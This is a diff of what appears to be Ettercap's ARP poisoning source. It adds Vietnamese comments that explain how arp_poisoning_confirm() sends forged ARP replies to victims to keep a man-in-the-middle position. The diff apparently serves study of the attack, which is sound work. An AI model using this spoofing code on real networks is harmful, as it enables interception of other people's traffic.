@@ -344,45 +344,78 @@ EC_THREAD_FUNC(arp_poisoner)
 /*
  * if a target wants to reconfirm the poisoned ARP information
  * it should be confirmed while poisoning
+ * 
+ * 
+ * Hàm arp_poisoning_confirm() có nhiệm vụ xác nhận quá trình ARP poisoning 
+ * bằng cách xử lý các gói tin ARP request và phản hồi lại các máy nạn nhân 
+ * bằng các gói tin ARP reply giả mạo. 
+ * Đây là phần quan trọng trong kỹ thuật Man-in-the-Middle (MITM), 
+ * khi kẻ tấn công muốn duy trì quyền kiểm soát dòng dữ liệu 
+ * giữa các thiết bị trong mạng sau khi quá trình ARP poisoning đã bắt đầu.
  */
 static void arp_poisoning_confirm(struct packet_object *po)
 {
+   //g1 và g2: Con trỏ tới các phần tử trong danh sách arp_group_one và arp_group_two, 
+   // đại diện cho các mục tiêu trong cuộc tấn công ARP poisoning.
    struct hosts_list *g1, *g2;
+   // tmp: Bộ đệm ký tự để lưu địa chỉ IP dưới dạng chuỗi, dùng cho mục đích hiển thị.
    char tmp[MAX_ASCII_ADDR_LEN];
 
    /* ignore ARP requests origined by ourself */
+   // đảm bảo rằng máy tấn công không tự phản hồi lại các gói tin do chính mình gửi ra.
    if (!memcmp(po->L2.src, EC_GBL_IFACE->mac, MEDIA_ADDR_LEN)) 
       return;
 
+   //Hàm ghi lại thông tin về địa chỉ IP đích của gói ARP request 
+   // để theo dõi hoạt động xác nhận ARP poisoning trong các thông điệp gỡ lỗi.
    DEBUG_MSG("arp_poisoning_confirm(%s)", ip_addr_ntoa(&po->L3.dst, tmp));
 
    /* walk through the lists if ARP request was for a victim */
    LIST_FOREACH(g1, &arp_group_one, next) {
       /* if the sender is in group one ... */
+      // po->L3.src là địa chỉ IP nguồn gửi đi gói ARP request
       if (!ip_addr_cmp(&po->L3.src, &g1->ip)) {
          /* look if the target is in group two ... */
          LIST_FOREACH(g2, &arp_group_two, next) {
+            // po->L3.dst là địa chỉ IP đich đến của gói ARP request
             if (!ip_addr_cmp(&po->L3.dst, &g2->ip)) {
                /* confirm the sender with the poisoned ARP reply */
+               // hàm gửi một gói ARP reply giả mạo để xác nhận ARP poisoning. 
+               // ARP reply này có địa chỉ MAC giả là địa chỉ của máy tấn công (EC_GBL_IFACE->mac),
+               // làm cho nạn nhân tin rằng máy tấn công là đích đến hợp lệ.
                send_arp(ARPOP_REPLY, &po->L3.dst, EC_GBL_IFACE->mac, &po->L3.src, po->L2.src);
             }
          }
       }
 
+      // ARP poisoning hai chiều (bi-directional poisoning)
       if (!poison_oneway) {
          /* else if the target is in group one ... */
+         // hàm tiếp tục kiểm tra thêm một lần nữa để xem 
+         // liệu địa chỉ đích IP của gói ARP request có nằm trong arp_group_one
          if (!ip_addr_cmp(&po->L3.dst, &g1->ip)) {
+
             /* look if the sender is in group two ... */
+            // hàm tiếp tục kiểm tra thêm một lần nữa để xem 
+            // liệu địa chỉ nguồn IP có nằm trong arp_group_two không
             LIST_FOREACH(g2, &arp_group_two, next) {
                if (!ip_addr_cmp(&po->L3.src, &g2->ip)) {
                   /* confirm the sender with the poisoned ARP reply */
-                     send_arp(ARPOP_REPLY, &po->L3.dst, EC_GBL_IFACE->mac, &po->L3.src, po->L2.src);
+                  // nếu điều kiện khớp hàm sẽ gửi gói ARP reply giả mạo. 
+                  // Điều này giúp duy trì quá trình ARP poisoning liên tục bằng cách 
+                  // làm giả bảng ARP của các nạn nhân.
+                  send_arp(ARPOP_REPLY, &po->L3.dst, EC_GBL_IFACE->mac, &po->L3.src, po->L2.src);
                }
             }
          }
       }
    }
 }
+/* KẾT LUẬN arp_poisoning_confirm()
+Hàm arp_poisoning_confirm() lắng nghe các gói ARP request trong mạng. 
+Nếu gói ARP request đến từ một trong các mục tiêu bị ARP poisoning, 
+hàm sẽ gửi một gói ARP reply giả mạo để tiếp tục duy trì quá trình tấn công.*/
+
 
 
 /*
